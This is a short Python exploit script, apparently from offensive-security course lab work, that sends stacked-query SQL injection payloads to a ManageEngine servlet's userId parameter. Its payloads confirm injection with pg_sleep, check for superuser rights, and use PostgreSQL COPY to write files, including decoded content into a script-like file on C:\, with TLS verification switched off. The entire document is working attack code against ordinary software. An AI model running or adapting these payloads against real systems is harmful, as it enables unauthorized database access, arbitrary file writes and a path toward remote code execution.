import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

payloads = [
    "select+pg_sleep(10);", # Proove SQLI
    "CREATE+TEMP+TABLE+AWAE(offsec text);INSERT+INTO+AWAE(offsec)+VALUES+($$tes2t$$);COPY+AWAE(offsec)+TO $$C:\\test.txt$$;", # Prove file Write
    "SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;", # Prove is admin
    "copy+(select+convert_from(decode($$%3D%3D$$,$$base64$$),$$utf-8$$))+to+$$C:\\wmiget.vbasasdasd$$;"
]


def main():
    if len(sys.argv) != 2:
        print(f"(+) usage: {sys.argv[0]} payloadID")
        sys.exit(1)

    payload_id = int(sys.argv[1])
    print(f"Payload = ForMasRange=1&userId=1;{payload_id}")
    try:
        if payload_id < 0 or payload_id >= len(payloads):
            raise ValueError
    except ValueError:
        print("(-) Invalid payload ID")
        sys.exit(1)

    
    payload = payloads[payload_id]
    print(f'ForMasRange=1&userId=1;{payload}--+')
    
    
    r = requests.post('https://manageengine:8443/servlet/AMUserResourcesSyncServlet', 
					  params=f'ForMasRange=1&userId=1;{payload}--+' , verify=False)
    
    print(r.text)
    print(r.headers)

if __name__ == '__main__':
	main()